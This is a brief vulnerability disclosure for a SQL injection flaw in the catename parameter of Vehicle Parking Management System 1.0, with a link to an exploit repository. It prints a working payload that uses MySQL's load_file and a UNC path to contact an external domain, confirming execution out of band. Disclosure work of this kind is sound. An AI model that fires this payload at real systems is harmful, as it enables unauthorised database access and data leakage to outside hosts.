[+] Exploit Source: 
https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-37806

[+] Description:
The catename parameter from Vehicle Parking Management System affected version 1.0 app appears to be vulnerable to SQL injection attacks - type time-based blind. 
The payload '+(select load_file('\\\\ma0xscj8wyb2gd8sai9pcyvl7cd51xvlmoagx6lv.nu11secur1ty.net\\hgt'))+' was submitted in the catename parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
